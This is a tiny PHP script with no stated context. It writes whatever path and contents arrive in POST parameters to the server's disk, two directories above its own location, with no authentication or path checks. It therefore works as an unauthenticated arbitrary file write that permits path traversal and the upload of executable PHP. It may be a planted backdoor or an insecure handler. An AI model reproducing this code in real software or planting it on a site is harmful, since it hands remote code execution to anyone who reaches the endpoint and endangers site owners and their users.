<?php
	$f = file_put_contents(dirname(__FILE__) . '/../../' . $_POST['file'], $_POST['contents']) or die("Can not open file");
?>